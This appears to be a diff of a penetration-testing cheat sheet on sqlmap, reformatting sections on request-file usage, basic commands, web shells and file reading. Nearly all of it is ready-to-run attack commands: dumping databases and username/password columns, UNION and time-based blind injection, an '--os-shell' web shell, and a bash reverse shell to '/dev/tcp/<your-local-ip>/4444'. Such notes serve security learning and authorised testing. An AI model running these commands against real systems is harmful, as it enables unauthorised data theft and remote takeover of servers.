@@ -10,29 +10,31 @@ render_with_liquid: true
 
 - **Sqlmap**
 
-    1. **Useful Usage**
+    Sqlmap is an usefule command-line tool for SQL injection automatically.  
+    You can specify the request settings file which generated in **Burp Suite** by adding the flag **"-r"**.
 
-        You can specify the request settings file which generated in **Burp Suite**.
+    ```sh
+    sqlmap -r request.txt
+    sqlmap -r request.txt --dump --dbs --tables --columns --random-agent
+    sqlmap -r request.txt --dump --dbms mysql --risk 3 --level 5
 
-        ```sh
-        sqlmap -r request.txt
-        sqlmap -r request.txt --dump --dbs --tables --columns --random-agent
-        sqlmap -r request.txt --dump --dbms mysql --risk 3 --level 5
+    # --fresh-queries: new data in tables
+    sqlmap -r request.txt --fresh-queries
 
-        # Specify dabase name, table name, column name
-        sqlmap -r request.txt -D database_name -T table_name -C column_name
-        # Specify multiple columns
-        sqlmap -r request.txt -D database_name -T table_name -C username,password
+    # Specify dabase name, table name, column name
+    sqlmap -r request.txt -D database_name -T table_name -C column_name
+    # Specify multiple columns
+    sqlmap -r request.txt -D database_name -T table_name -C username,password
 
-        # --technique=U: UNION attack
-        # --delay=2: Time Delay
-        sqlmap -r request.txt --technique=U --delay=2
+    # --technique=U: UNION attack
+    # --delay=2: Time Delay
+    sqlmap -r request.txt --technique=U --delay=2
 
-        # --time-sec: Sleep time for Time-Based Blind SQLi
-        sqlmap -r request.txt --time-sec 2
-        ```
+    # --time-sec: Sleep time for Time-Based Blind SQLi
+    sqlmap -r request.txt --time-sec 2
+    ```
 
-    2. **Basic Commands**
+    - **Basic Commands**
 
         ```sh
         # GET request
@@ -44,7 +46,7 @@ render_with_liquid: true
         sqlmap -u "http://<target-ip>" --data="username=test&password=test"
         ```
 
-    3. **Web Shell**
+    - **Web Shell**
 
         Add option "--os-shell" to interact with web shell.
 
@@ -67,7 +69,7 @@ render_with_liquid: true
         os-shell> bash -c 'bash -i >& /dev/tcp/<your-local-ip>/4444 0>&1'
         ```
 
-    4. **Read File**
+    - **Read File**
 
         ```sh
         # --batch: never ask for user input, use the default behavior
